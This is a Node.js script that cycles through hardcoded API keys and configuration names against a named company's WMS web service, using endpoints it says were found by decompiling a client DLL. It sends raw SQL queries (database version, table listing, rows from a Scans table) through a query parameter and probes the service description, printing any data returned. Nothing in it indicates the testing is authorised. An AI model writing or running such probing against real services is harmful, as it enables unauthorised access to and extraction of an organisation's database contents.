import axios from 'axios'

const BASE = 'https://simflex.innodata.com/wms.services/'
const KEYS = ['00001111', '9fe71892-a94f-446a-a79d-a273b2ed4ba6']
const CONFIGS = ['045_Test', '046', '045', 'JAG', 'JAGSP', 'PH_JAG', 'PHJAG', 'Jaguar', 'MDE', 'MUSTANG', 'PH-MUSTANG', 'PHMUSTANG', 'PH_MUSTANG', '045Test', 'JAG045', 'JAGSP_WMS']

// Discovered from WMSConnect.dll decompilation
const ASMX_ENDPOINTS = [
  'WMS.Services.asmx/TechGetDatabaseDataset',
  'WMS.Services.asmx/GetAllocationsDt',
  'WMS.Services.asmx/TaskStart',
  'WMS.Services.asmx',
  'WMS.Services.asmx?WSDL',
]

const SQL_SCRIPTS = [
  'SELECT TOP 5 * FROM Scans',
  'SELECT TOP 5 * FROM INFORMATION_SCHEMA.TABLES',
  'SELECT @@VERSION',
]

async function run() {
  console.log('\n🔍 Testing WMS.Services.asmx endpoints (from DLL)\n')

  for (const key of KEYS) {
    for (const config of CONFIGS) {
      // Test TechGetDatabaseDataset with SQL
      for (const script of SQL_SCRIPTS) {
        try {
          const res = await axios.get(`${BASE}WMS.Services.asmx/TechGetDatabaseDataset`, {
            params: { apiKey: key, config, script },
            timeout: 10000
          })
          console.log(`✅ SUCCESS! key:${key} config:${config}`)
          console.log('Status:', res.status)
          console.log('Data:', JSON.stringify(res.data, null, 2).substring(0, 500))
          process.exit(0)
        } catch (e) {
          console.log(`❌ ${e.response?.status || e.message} | TechGetDatabaseDataset | key:${key} | config:${config}`)
          if (e.response?.status === 200 || e.response?.status === 500) {
            console.log('Response body:', JSON.stringify(e.response.data).substring(0, 300))
          }
        }
      }

      // Test GetAllocationsDt
      try {
        const res = await axios.get(`${BASE}WMS.Services.asmx/GetAllocationsDt`, {
          params: { apiKey: key, userKey: key, config },
          timeout: 10000
        })
        console.log(`✅ GetAllocationsDt SUCCESS! key:${key}`)
        console.log('Data:', JSON.stringify(res.data, null, 2).substring(0, 500))
      } catch (e) {
        console.log(`❌ ${e.response?.status || e.message} | GetAllocationsDt | key:${key}`)
      }
    }
  }

  // Test WSDL to discover all available methods
  console.log('\n📋 Checking WSDL...')
  try {
    const res = await axios.get(`${BASE}WMS.Services.asmx`, {
      params: { WSDL: '' },
      timeout: 10000
    })
    console.log('✅ WSDL found!')
    console.log(res.data.substring(0, 1000))
  } catch (e) {
    console.log(`❌ WSDL: ${e.response?.status || e.message}`)
    if (e.response?.data) {
      console.log('Body:', String(e.response.data).substring(0, 500))
    }
  }

  console.log('\n❌ No working combination found.')
}

run().catch(console.error)
